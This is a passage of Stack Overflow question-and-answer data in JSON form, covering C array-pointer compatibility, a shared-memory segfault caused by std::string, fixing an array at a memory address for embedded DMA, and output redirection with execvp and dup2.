"creation_date": 1544624457, "answer_id": 53745078, "question_id": 53743670, "link": "https://stackoverflow.com/questions/53743670/assigning-a-pointer-to-a-larger-array-to-a-pointer-to-a-smaller-vla/53745078#53745078", "title": "Assigning a pointer to a larger array to a pointer to a smaller VLA", "body": "<p><code>const char[3]</code> is not compatible with <code>char[37]</code>. </p>\n\n<p>Nor is \"pointer to qualified type\" compatible with \"pointer to type\" - don't mix this up with \"qualified pointer to type\". (Const correctness does unfortunately not work with array pointers.)</p>\n\n<p>The relevant part being the rule of simple assignment C17 6.5.16.1:</p>\n\n<blockquote>\n  <ul>\n  <li>the left operand has atomic, qualified, or unqualified pointer type, and (considering\n  the type the left operand would have after lvalue conversion) both operands are\n  pointers to qualified or unqualified versions of compatible types, and the type pointed\n  to by the left has all the qualifiers of the type pointed to by the right;</li>\n  </ul>\n</blockquote>\n\n<p>Looking at various compilers:</p>\n\n<ul>\n<li><p>gcc in \"gnu mode\" is useless for checking C conformance. You must compile with <code>-std=cxx -pedantic-errors</code>. After which gcc behaves fine: <a href=\"https://godbolt.org/z/1azFKQ\" rel=\"nofollow noreferrer\"><code>gcc -std=c17 -pedantic-errors</code></a>:</p>\n\n<blockquote>\n  <p>error: pointers to arrays with different qualifiers are incompatible in ISO C [-Wpedantic]</p>\n</blockquote></li>\n<li><p>icc gives the same diagnostics as gcc, it works fine.</p></li>\n<li><p>Whereas <code>clang -std=c17 -pedantic-errors</code> does not report errors, so it apparently does not conform to the C standard. </p></li>\n</ul>\n"}], "owner": {"reputation": 51929, "user_id": 1084774, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/13403db744d8aa130bb317576cc1df30?s=128&d=identicon&r=PG", "display_name": "PSkocik", "link": "https://stackoverflow.com/users/1084774/pskocik"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 116, "favorite_count": 0, "accepted_answer_id": 53745078, "answer_count": 1, "score": 3, "last_activity_date": 1544624457, "creation_date": 1544619835, "last_edit_date": 1544620303, "question_id": 53743670, "link": "https://stackoverflow.com/questions/53743670/assigning-a-pointer-to-a-larger-array-to-a-pointer-to-a-smaller-vla", "title": "Assigning a pointer to a larger array to a pointer to a smaller VLA", "body": "<p>I noticed C compilers (gcc, clang, tinycc) allow me to assign a pointer to a larger array to a pointer to a smaller VLA without a warning:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#if !__TINYC__\nvoid take_vla(int N, char const X[1][N]) { printf(\"%zd\\n\", sizeof(*X)); }\n#endif\nint main()\n{\n    static char bigarray[]=\"0123456789abcdefghijklmnopqrstuvwxyz\";\n    //VLA\n    int n = 3;\n    char const (*subarray2)[n]=&amp;bigarray;\n    //char const (*subarray3)[(int){3}]=&amp;bigarray; //VLA but clang doesn't see it as such (a bug, I guess)\n#if !__TINYC__\n    take_vla(3,&amp;bigarray);\n    take_vla(3,&amp;\"abcdefg\");\n#endif\n\n    #if 0\n        char const (*subarray1)[3]=&amp;bigarray; //-Wincompatible-pointer-types\n    #endif\n}\n</code></pre>\n\n<p>Is this conformant C and why?</p>\n"}, {"tags": ["c++", "c", "unix", "operating-system"], "comments": [{"owner": {"reputation": 31368, "user_id": 3133316, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/30f0b31e22bec21f12f31cd30ae5b148?s=128&d=identicon&r=PG&f=1", "display_name": "PaulMcKenzie", "link": "https://stackoverflow.com/users/3133316/paulmckenzie"}, "edited": false, "score": 1, "creation_date": 1544619503, "post_id": 53743485, "comment_id": 94339633, "body": "How is this to work if <code>std::string</code> allocates the string data from the heap at runtime?  The <code>sizeof(shared)</code> remains constant, since <code>sizeof</code> is a compile-time value."}, {"owner": {"reputation": 7825, "user_id": 3684343, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5bee557e309dc42d91a706c70c8c0c9f?s=128&d=identicon&r=PG&f=1", "display_name": "mch", "link": "https://stackoverflow.com/users/3684343/mch"}, "edited": false, "score": 1, "creation_date": 1544619516, "post_id": 53743485, "comment_id": 94339641, "body": "You cannot put an <code>std::string</code> into a shared memory, only POD-types."}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1544619568, "post_id": 53743485, "comment_id": 94339667, "body": "Why do you think a C++ <code>std::string</code> object will restrict itself to a specific location?"}, {"owner": {"reputation": 31368, "user_id": 3133316, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/30f0b31e22bec21f12f31cd30ae5b148?s=128&d=identicon&r=PG&f=1", "display_name": "PaulMcKenzie", "link": "https://stackoverflow.com/users/3133316/paulmckenzie"}, "edited": false, "score": 1, "creation_date": 1544619872, "post_id": 53743485, "comment_id": 94339856, "body": "<a href=\"http://coliru.stacked-crooked.com/a/ed18bb267ab09e7b\" rel=\"nofollow noreferrer\">This illustrates why this code will not work</a>.  The <code>sizeof(shared)</code> remains at 200, regardless of the number of characters placed in one element of the string array."}, {"owner": {"reputation": 599, "user_id": 5131614, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7Djml.jpg?s=128&g=1", "display_name": "arjunkhera", "link": "https://stackoverflow.com/users/5131614/arjunkhera"}, "edited": false, "score": 0, "creation_date": 1544620312, "post_id": 53743485, "comment_id": 94340073, "body": "Thanks for the code, I see the mistake now. The buffer space I allocate is fixed, whereas the memory for strings are being taken from heap, hence the segmentation fault."}, {"owner": {"reputation": 83151, "user_id": 3943312, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fc00b38b94ca7b6f820622b0a8af8ded?s=128&d=identicon&r=PG", "display_name": "Sam Varshavchik", "link": "https://stackoverflow.com/users/3943312/sam-varshavchik"}, "edited": false, "score": 0, "creation_date": 1544620351, "post_id": 53743485, "comment_id": 94340086, "body": "And to add to the growing list of fundamental problems: like every other C++ class, <code>std::string</code> has a constructor. Which must be used for constructing <b><i>every</i></b> instance of the class. Creating a shared memory segment, and converting it to a pointer, just like that, is not going to result in its constructor being invoked, automatically. C++ does not work this way."}, {"owner": {"reputation": 599, "user_id": 5131614, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7Djml.jpg?s=128&g=1", "display_name": "arjunkhera", "link": "https://stackoverflow.com/users/5131614/arjunkhera"}, "edited": false, "score": 0, "creation_date": 1544620364, "post_id": 53743485, "comment_id": 94340093, "body": "How should I go about correcting this ?"}, {"owner": {"reputation": 83151, "user_id": 3943312, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fc00b38b94ca7b6f820622b0a8af8ded?s=128&d=identicon&r=PG", "display_name": "Sam Varshavchik", "link": "https://stackoverflow.com/users/3943312/sam-varshavchik"}, "edited": false, "score": 0, "creation_date": 1544620410, "post_id": 53743485, "comment_id": 94340122, "body": "The best way to figure out how to do this correctly is to keep learning C++ and trying to understand how it works. How classes work. What a constructor and a destructor means. And so on. Once you have good, solid understanding of the core principles of C++ language itself, then you can branch out in operating system-specific topics like shared memory, that have nothing to do with C++, and figure out how to make everything fit together."}, {"owner": {"reputation": 599, "user_id": 5131614, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7Djml.jpg?s=128&g=1", "display_name": "arjunkhera", "link": "https://stackoverflow.com/users/5131614/arjunkhera"}, "reply_to_user": {"reputation": 83151, "user_id": 3943312, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fc00b38b94ca7b6f820622b0a8af8ded?s=128&d=identicon&r=PG", "display_name": "Sam Varshavchik", "link": "https://stackoverflow.com/users/3943312/sam-varshavchik"}, "edited": false, "score": 0, "creation_date": 1544620978, "post_id": 53743485, "comment_id": 94340408, "body": "@SamVarshavchik thanks for the advice. I am aware of the basics of classes and related stuff, although I agree I need to work more on my C++ skills. However, a little direction into how to solve this problem would be appreciable so that I can figure out what is the best way to tackle this issue."}, {"owner": {"reputation": 83151, "user_id": 3943312, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fc00b38b94ca7b6f820622b0a8af8ded?s=128&d=identicon&r=PG", "display_name": "Sam Varshavchik", "link": "https://stackoverflow.com/users/3943312/sam-varshavchik"}, "edited": false, "score": 0, "creation_date": 1544621157, "post_id": 53743485, "comment_id": 94340510, "body": "Until you have a firm grasp on things like custom allocators, the rule of thumb for you to follow, right now, is that the only thing you can put into shared memory are plain values and arrays. No classes like <code>std::string</code>. Basically, if it has a constructor, or a destructor, you can&#39;t have it in shared memory, and even for plain non-class data, you have to keep in mind that shared memory is not initialized, and you are responsible for clearing its contents to their initial values."}, {"owner": {"reputation": 599, "user_id": 5131614, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7Djml.jpg?s=128&g=1", "display_name": "arjunkhera", "link": "https://stackoverflow.com/users/5131614/arjunkhera"}, "edited": false, "score": 0, "creation_date": 1544622737, "post_id": 53743485, "comment_id": 94341480, "body": "Thanks for the advice, I was able to workaround this problem by using a character array with a fixed size. It would be nice if any one of you can answer this question along with this fix so that I can mark it accepted and close the question."}], "owner": {"reputation": 599, "user_id": 5131614, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7Djml.jpg?s=128&g=1", "display_name": "arjunkhera", "link": "https://stackoverflow.com/users/5131614/arjunkhera"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 125, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1544619215, "creation_date": 1544619215, "question_id": 53743485, "link": "https://stackoverflow.com/questions/53743485/unable-to-access-string-array-in-shared-memory", "title": "Unable to access string array in Shared Memory", "body": "<p>I am trying to send lines of text from a writer program to a reader program through shared memory. The writer works perfectly. However, during the execution of the reader program, I get a segmentation fault at the following line</p>\n\n<p><code>cout&lt;&lt;buffer-&gt;str[initial]&lt;&lt;endl;</code></p>\n\n<p><strong>The changes in count value of the shared structure are visible and correctly incremented when I run the reader simultaneously alongside the writer while commenting the above line. Hence, according to my diagnosis, the issue is with accessing the array of strings of the shared structure. Why is this the case ?</strong></p>\n\n<p>The code consists of the writer.cpp and reader.cpp which have been provided below for reference. </p>\n\n<p>The aim of the writer.cpp is to read lines from an input file and then write them in the shared memory.</p>\n\n<p><strong>Writer.cpp</strong></p>\n\n<pre><code>// for c++ related functions\n#include&lt;iostream&gt;\n#include&lt;fstream&gt;\n#include&lt;string&gt;\n\n// for c related functions\n#include&lt;cstdio&gt;\n#include&lt;cstdlib&gt;\n#include&lt;unistd.h&gt;\n\n// for system calls\n#include&lt;sys/types.h&gt;\n#include&lt;sys/ipc.h&gt;\n// for shared memory\n#include&lt;sys/shm.h&gt;\n\nusing namespace std;\n\n// store the key for accessing the shared memory\nkey_t shm_key = ftok(\"practical\",65);\n\n// the structure for shared memory\nstruct shared{\n  bool the_end = false;\n  int count = 0;\n  string str[6];\n};\n\nint main(){\n\n  // create the shared memory\n  int shmid = shmget(shm_key,sizeof(shared),0666|IPC_CREAT);\n  if(shmid == -1){\n    perror(\"Error in creating shared memory\");\n    return 1;\n  }\n\n  // attach server to the shared memory\n  struct shared *buffer = (shared*)shmat(shmid,NULL,0);\n  if(buffer == (void *) -1){\n     perror(\"Unable to attach to shared memory\");\n     return 1;\n  }\n\n  // open the file for reading the input\n  ifstream fin(\"input.txt\");\n  // check for errors in opening the file\n  if(!fin){\n    cerr&lt;&lt;\"Error in opening the file\"&lt;&lt;endl;\n    exit(1);\n  }\n\n  // to store the read line\n  string inptxt;\n  cout&lt;&lt;\"Reading contents from file\\n\"&lt;&lt;endl;\n\n  while(fin){\n    // read a line\n    getline(fin,inptxt);\n\n    // exit the loop if string is empty\n    if(inptxt == \"\\0\") break;\n\n    // store the line in the buffer\n    buffer-&gt;str[buffer-&gt;count++] = inptxt;\n    cout&lt;&lt;\"This was written : \"&lt;&lt;buffer-&gt;str[buffer-&gt;count-1]&lt;&lt;endl;\n\n    sleep(3);\n  }\n  cout&lt;&lt;\"Closing the file\"&lt;&lt;endl;\n  fin.close();\n\n  // marks the end of writing into shared memory\n  buffer-&gt;the_end = true;\n\n  if(shmdt(buffer) == -1){\n     perror(\"error in deatching from shared memory\");\n     return 1;\n  }\n\n  if(shmctl(shmid,IPC_RMID,0) == -1){\n     perror(\"error in destroying the shared memory\");\n     return 1;\n  }\n\n  cout&lt;&lt;\"Writing Completed\"&lt;&lt;endl;\n  return 0;\n}\n</code></pre>\n\n<p>The aim of the reader program is to read lines from the shared memory and then display them on the console.</p>\n\n<p><strong>Reader.cpp</strong></p>\n\n<pre><code>// for c++ related functions\n#include&lt;iostream&gt;\n#include&lt;fstream&gt;\n#include&lt;string&gt;\n\n// for c related functions\n#include&lt;cstdio&gt;\n#include&lt;cstdlib&gt;\n#include&lt;unistd.h&gt;\n\n// for system calls\n#include&lt;sys/types.h&gt;\n#include&lt;sys/ipc.h&gt;\n// for shared memory\n#include&lt;sys/shm.h&gt;\n\nusing namespace std;\n\n// store the key for accessing the shared memory\nkey_t shm_key = ftok(\"practical\",65);\n\n// the structure for shared memory\nstruct shared{\n  bool the_end = false;\n  int count = 0;\n  string str[6];\n};\n\nint main(){\n\n  // create the shared memory\n  int shmid = shmget(shm_key,sizeof(shared),0666|IPC_CREAT);\n  if(shmid == -1){\n    perror(\"Error in creating shared memory\");\n    return 1;\n  }\n\n  // attach server to the shared memory\n  struct shared *buffer = (shared*)shmat(shmid,NULL,0);\n  if(buffer == (void *) -1){\n     perror(\"Unable to attach to shared memory\");\n     return 1;\n  }\n\n  cout&lt;&lt;\"Reading contents from shared memory\\n\"&lt;&lt;endl;\n\n  int initial = 0;\n  while(!buffer-&gt;the_end){\n    if(buffer-&gt;count &gt; initial){\n      cout&lt;&lt;\"initial : \"&lt;&lt;initial&lt;&lt;\" buffer count : \"&lt;&lt;buffer-&gt;count&lt;&lt;\"\\n\";\n      // the following line gives segmentation fault\n      // cout&lt;&lt;buffer-&gt;str[initial]&lt;&lt;endl;\n      initial++;\n    }\n  }\n\n  if(shmdt(buffer) == -1){\n     perror(\"error in deatching from shared memory\");\n     return 1;\n  }\n\n  cout&lt;&lt;\"Reading Completed\"&lt;&lt;endl;\n  return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "embedded"], "comments": [{"owner": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "edited": false, "score": 0, "creation_date": 1544639360, "post_id": 53743480, "comment_id": 94351022, "body": "While the provided answers may be a suitable solution for you and are portable across compilers, must compilers support extensions or linker directives to do this.  For an answer that uses that option, you&#39;d have to specify your tool chain and possibly target architecture.  Some toolchains make it easy; GCC is a little cumbersome/ <a href=\"https://mcuoneclipse.com/2012/11/01/defining-variables-at-absolute-addresses-with-gcc/\" rel=\"nofollow noreferrer\">mcuoneclipse.com/2012/11/01/&hellip;</a>"}], "answers": [{"comments": [{"owner": {"reputation": 1214, "user_id": 1182849, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/3ee45693710cd55e207c6b1c77c43103?s=128&d=identicon&r=PG", "display_name": "grorel", "link": "https://stackoverflow.com/users/1182849/grorel"}, "edited": false, "score": 0, "creation_date": 1544626417, "post_id": 53743579, "comment_id": 94343652, "body": "The memory is actually reserved and the linker cannot allocate anything in it, +1 for this explanation"}], "tags": [], "owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "is_accepted": false, "score": 2, "last_activity_date": 1544619532, "creation_date": 1544619532, "answer_id": 53743579, "question_id": 53743480, "link": "https://stackoverflow.com/questions/53743480/how-to-set-base-address-of-a-matrix/53743579#53743579", "title": "How to set base address of a matrix?", "body": "<p>If you want to <em>allocate</em> memory at a fixed address, you must use non-standard ways and also modify the linker script. This is compiler/linker specific.</p>\n\n<p>If the memory is already allocated at that position and you know for a fact that it is of type <code>float [100][2]</code>, or of no type at all (untouched by compiler), then you can do use an array pointer:</p>\n\n<pre><code>volatile float (*example_two)[100][2];\nexample_two = (volatile float(*)[100][2]) 0x80000000UL;\n</code></pre>\n\n<p>In case of gcc, always disable strict aliasing in embedded sytems, just to be sure the compiler won't go haywire when for example reading a DMA buffer. <code>gcc -fno-strict-aliasing</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 3128, "user_id": 2899520, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/9d046c85ed155fb3e964d9dd4c43842a?s=128&d=identicon&r=PG&f=1", "display_name": "LearningC", "link": "https://stackoverflow.com/users/2899520/learningc"}, "is_accepted": false, "score": -1, "last_activity_date": 1544620035, "last_edit_date": 1544620035, "creation_date": 1544619621, "answer_id": 53743607, "question_id": 53743480, "link": "https://stackoverflow.com/questions/53743480/how-to-set-base-address-of-a-matrix/53743607#53743607", "title": "How to set base address of a matrix?", "body": "<p>If you take these statements as in c language,<br>\n<code>volatile float *example_one = (volatile float *)0x80000000;</code><br>\nhere you make a pointer point to a location that you specify.<br>\nwhere as the following statement,<br>\n<code>volatile float example_two[100][2]</code><br>\ncreates an array. there is a memory allocation happening. So they are different statements.<br>\nYou can create a pointer to an array in this case and try as,<br>\n<code>volatile float (*example_two)[100][2] = (volatile float *)0x80000000;</code><br>\nYou need to access the data then as <code>(*example_two)[i][j]</code></p>\n"}, {"tags": [], "owner": {"reputation": 97942, "user_id": 25324, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c812d568dcbf02b96796728be3cac626?s=128&d=identicon&r=PG", "display_name": "pmg", "link": "https://stackoverflow.com/users/25324/pmg"}, "is_accepted": false, "score": -1, "last_activity_date": 1544621393, "creation_date": 1544621393, "answer_id": 53744162, "question_id": 53743480, "link": "https://stackoverflow.com/questions/53743480/how-to-set-base-address-of-a-matrix/53744162#53744162", "title": "How to set base address of a matrix?", "body": "<p>Try (or don't try) this ugly <code>#define</code> trick</p>\n\n<pre><code>#define example_two (*donttrythisathome)\n\nfloat example_two[100][2] = (void*)0xDEADBEEF;\nexample_two[42][0] = example_two[42][1] = -0.42;\n</code></pre>\n\n<p>See working example on <a href=\"https://ideone.com/7c6dJ9\" rel=\"nofollow noreferrer\">https://ideone.com/7c6dJ9</a></p>\n"}, {"comments": [{"owner": {"reputation": 1214, "user_id": 1182849, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/3ee45693710cd55e207c6b1c77c43103?s=128&d=identicon&r=PG", "display_name": "grorel", "link": "https://stackoverflow.com/users/1182849/grorel"}, "edited": false, "score": 0, "creation_date": 1544626251, "post_id": 53745165, "comment_id": 94343546, "body": "Your first option is exactly what I was looking for."}], "tags": [], "owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "is_accepted": true, "score": 1, "last_activity_date": 1544624748, "creation_date": 1544624748, "answer_id": 53745165, "question_id": 53743480, "link": "https://stackoverflow.com/questions/53743480/how-to-set-base-address-of-a-matrix/53745165#53745165", "title": "How to set base address of a matrix?", "body": "<p>Consider:</p>\n\n<pre><code>volatile float (*example_two)[2] = (volatile float (*)[2]) 0x80000000;\n</code></pre>\n\n<p>This declaration allows you to use <code>example_two</code> as if it had been declared with <code>float example_two[100][2]</code>. For example, <code>example_two[i][j]</code> refers to element <code>j</code> of row <code>i</code>. By creating a pointer to arrays of two elements, this omits the <code>[100]</code> information from the type, but that is generally not needed.</p>\n\n<p>Another option is to write:</p>\n\n<pre><code>volatile float (*example_two)[100][2] = (volatile float (*)[100][2]) 0x80000000;\n</code></pre>\n\n<p>This includes the full type information, but then it must be dereferenced to be used, as in <code>(*example_two)[i][j]</code>. This is more cumbersome.</p>\n"}], "owner": {"reputation": 1214, "user_id": 1182849, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/3ee45693710cd55e207c6b1c77c43103?s=128&d=identicon&r=PG", "display_name": "grorel", "link": "https://stackoverflow.com/users/1182849/grorel"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 96, "favorite_count": 0, "accepted_answer_id": 53745165, "answer_count": 4, "score": 1, "last_activity_date": 1544624748, "creation_date": 1544619209, "last_edit_date": 1544620968, "question_id": 53743480, "link": "https://stackoverflow.com/questions/53743480/how-to-set-base-address-of-a-matrix", "title": "How to set base address of a matrix?", "body": "<p>I want to set the base address of a matrix of float at a precise place in my memory (embedded DSP development)</p>\n\n<p>I'd like to do something like this, which is not working :</p>\n\n<pre><code>// volatile because of the DMA filling the array automatically\n// base address is 0x80000000\nvolatile float example_two[100][2] = (volatile float *)0x80000000;\n</code></pre>\n\n<p>I know I can do it for a pointer like this, but I'll loose the array size ([100][2]):</p>\n\n<pre><code>// volatile because of the DMA filling the array automatically\n// base address is 0x80000000\nvolatile float *example_one = (volatile float *)0x80000000;\n</code></pre>\n\n<p>Is it possible ?</p>\n"}, {"tags": ["c", "linux", "redirect", "exec"], "comments": [{"owner": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "edited": false, "score": 1, "creation_date": 1544619442, "post_id": 53743311, "comment_id": 94339605, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/23322269/using-execvp-with-input-output-and-redirection\">Using execvp with Input,Output and redirection</a>"}, {"owner": {"reputation": 3, "user_id": 10767227, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e1797a7748ffd766805ff9456379c969?s=128&d=identicon&r=PG&f=1", "display_name": "ashly", "link": "https://stackoverflow.com/users/10767227/ashly"}, "reply_to_user": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "edited": false, "score": 0, "creation_date": 1544619654, "post_id": 53743311, "comment_id": 94339730, "body": "@ Chris Turner I mentioned in my question i tried to use it as a reference but couldn&#39;t make my program work"}, {"owner": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "edited": false, "score": 0, "creation_date": 1544622667, "post_id": 53743311, "comment_id": 94341436, "body": "But you managed to use that answer to redirect the input correctly. Redirecting the output is exactly the same"}, {"owner": {"reputation": 3, "user_id": 10767227, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e1797a7748ffd766805ff9456379c969?s=128&d=identicon&r=PG&f=1", "display_name": "ashly", "link": "https://stackoverflow.com/users/10767227/ashly"}, "reply_to_user": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "edited": false, "score": 0, "creation_date": 1544633598, "post_id": 53743311, "comment_id": 94348012, "body": "@Chris Turner how is it the same? im using int fd = open(&quot;/input.txt&quot;, O_RDONLY); for the input, but as far as I know the output should be used as programname&gt;outputfile in the args array, and in the answer they were using the args array also for the input, which I was not managed to do"}, {"owner": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "edited": false, "score": 0, "creation_date": 1544634098, "post_id": 53743311, "comment_id": 94348244, "body": "it is the same because you <code>open</code> a file and use <code>dup2</code> to replace stdout, exactly as the answer in the duplicate says and the answer below says too."}, {"owner": {"reputation": 3, "user_id": 10767227, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e1797a7748ffd766805ff9456379c969?s=128&d=identicon&r=PG&f=1", "display_name": "ashly", "link": "https://stackoverflow.com/users/10767227/ashly"}, "reply_to_user": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "edited": false, "score": 0, "creation_date": 1544634478, "post_id": 53743311, "comment_id": 94348417, "body": "@Chris Turner  so there is no need for char *args[]={&quot;program&quot;,&quot;&gt;&quot;,&quot;output.txt&quot;,NULL};?"}, {"owner": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "edited": false, "score": 0, "creation_date": 1544634672, "post_id": 53743311, "comment_id": 94348521, "body": "you don&#39;t need the <code>&quot;&gt;&quot;,&quot;output.txt&quot;</code> as it won&#39;t do what you want - as covered in the answer you&#39;ve just accepted, it&#39;s a feature of the shell - the <code>exec</code> functions will just pass it as arguments to your program"}], "answers": [{"comments": [{"owner": {"reputation": 3, "user_id": 10767227, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e1797a7748ffd766805ff9456379c969?s=128&d=identicon&r=PG&f=1", "display_name": "ashly", "link": "https://stackoverflow.com/users/10767227/ashly"}, "edited": false, "score": 0, "creation_date": 1544633925, "post_id": 53743809, "comment_id": 94348168, "body": "Do you mean using your code after the dup2(fd, 0); and before execvp(&quot;program&quot;,args)? and make the char array just char *args[]={&quot;program&quot;,NULL};? then how will the exec ? is it not going to make problems as to witch file is the input and which one is poor the output?"}, {"owner": {"reputation": 6679, "user_id": 10622916, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/21bd4eeaa5ba60dc021c5ccfbf4a963d?s=128&d=identicon&r=PG&f=1", "display_name": "Bodo", "link": "https://stackoverflow.com/users/10622916/bodo"}, "reply_to_user": {"reputation": 3, "user_id": 10767227, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e1797a7748ffd766805ff9456379c969?s=128&d=identicon&r=PG&f=1", "display_name": "ashly", "link": "https://stackoverflow.com/users/10767227/ashly"}, "edited": false, "score": 0, "creation_date": 1544638419, "post_id": 53743809, "comment_id": 94350538, "body": "@ashly Yes, that&#39;s what I mean. The executed <code>program</code> will not know which input and output file it is connected to. It has to read its input from <code>stdin</code> (file descriptor <code>0</code>) and write its output to <code>stdout</code> (file descriptor <code>1</code>). This is the purpose of input and output redirection."}, {"owner": {"reputation": 3, "user_id": 10767227, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e1797a7748ffd766805ff9456379c969?s=128&d=identicon&r=PG&f=1", "display_name": "ashly", "link": "https://stackoverflow.com/users/10767227/ashly"}, "edited": false, "score": 0, "creation_date": 1544642517, "post_id": 53743809, "comment_id": 94352603, "body": "think i got he idea,thank you, one more thing,if you don&#39;t mind,whenever i run the program I can&#39;t really see the output, does using &quot;program&quot; and not &quot;program.c&quot;/&quot;program -c &quot; is correct? or &quot;&quot;/input.txt&quot; and not &quot;input.txt&quot;?"}, {"owner": {"reputation": 6679, "user_id": 10622916, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/21bd4eeaa5ba60dc021c5ccfbf4a963d?s=128&d=identicon&r=PG&f=1", "display_name": "Bodo", "link": "https://stackoverflow.com/users/10622916/bodo"}, "reply_to_user": {"reputation": 3, "user_id": 10767227, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e1797a7748ffd766805ff9456379c969?s=128&d=identicon&r=PG&f=1", "display_name": "ashly", "link": "https://stackoverflow.com/users/10767227/ashly"}, "edited": false, "score": 0, "creation_date": 1544711276, "post_id": 53743809, "comment_id": 94379718, "body": "@ashly What do you mean with &quot;I can&#39;t really see the output&quot;. It doesn&#39;t appear in the output file? You can&#39;t find the output file? You don&#39;t see any output in the terminal window? Your compiled program is probably named <code>program</code> if the source code is <code>program.c</code>. <code>&#47;input.txt</code> is a file in the root directory which is probably wrong. <code>input.txt</code> is a file in the current working directory. Please check the return code of all called functions because it will tell you if something went wrong."}], "tags": [], "owner": {"reputation": 6679, "user_id": 10622916, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/21bd4eeaa5ba60dc021c5ccfbf4a963d?s=128&d=identicon&r=PG&f=1", "display_name": "Bodo", "link": "https://stackoverflow.com/users/10622916/bodo"}, "is_accepted": true, "score": 0, "last_activity_date": 1544620247, "creation_date": 1544620247, "answer_id": 53743809, "question_id": 53743311, "link": "https://stackoverflow.com/questions/53743311/use-execvp-with-input-file-to-a-program-and-redirection-output-to-a-new-file/53743809#53743809", "title": "Use execvp with Input file to a program and redirection output to a new file", "body": 